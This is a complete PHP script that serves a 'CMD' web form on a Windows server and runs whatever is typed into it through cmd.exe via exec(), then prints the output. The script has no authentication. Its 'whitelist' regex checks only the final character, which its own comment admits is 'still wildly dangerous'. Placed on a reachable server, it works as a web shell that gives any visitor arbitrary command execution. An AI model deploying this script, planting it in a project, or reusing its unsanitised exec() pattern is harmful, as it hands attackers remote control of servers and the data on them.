<?php
/* WARNING - DO NOT USE THIS SCRIPT ON "PRODUCTION" WINDOWS WEB SERVERS */
$Command = $_POST["Command"];
$head = "<head>\n<title>CMD</title>\n</head>";
$goback_js = "<script type=\"text/javascript\">\nfunction goBack(){\nwindow.history.back()\n}\n</script>\n";
$newcom_button = "<input type=\"button\" value=\"New Command\" onclick=\"goBack()\" /><br /><br />";

if (!isset($_POST["Submit"])) { // If page is not submitted to self echo form.

	print (
			"$head
			<body>
		 	<form method=\"post\" action=\"$PHP_SELF\">
  		 	C:\>&nbsp&nbsp&nbsp<input type=\"text\" size=\"50\" maxlength=\"120\" name=\"Command\"/><br />
  		 	<input type=\"Submit\" value=\" Run \" name=\"Submit\"/>
 		 	</form>
  		 	</body>"
		);
  
}else{ // Run as if from the windows command prompt, end after - output in textfile (needs to be system writable).
	
	if (preg_match('/^.*[0-9|a-z|\$|\/|&|:|\\\|"|\.|\?|\*]$/', $Command)) {  // Character whitelist validation - still wildly dangerous!
		
		exec("cd\ & c: & cmd.exe /c $Command >" . dirname(__FILE__) . "\outputlog.txt 2>&1");  
		
	}else{
		
		die("$head\n$goback_js\nCommand not allowed<br /><br />$newcom_button");
		
	}

	print ( // Display the results of the command line by line - display new command button (just a browser back, a cheat to get the previous command to populate without work).
 		 	"$head
			$goback_js
			<body>
			<b>$Command results</b>&nbsp&nbsp&nbsp<br />$newcom_button"
  		);
  
$lines = file("outputlog.txt");
  	foreach ($lines as $line_num => $line) {
    print ("$line <br />\n</body>");
	}
	
unlink("outputlog.txt");
}
?>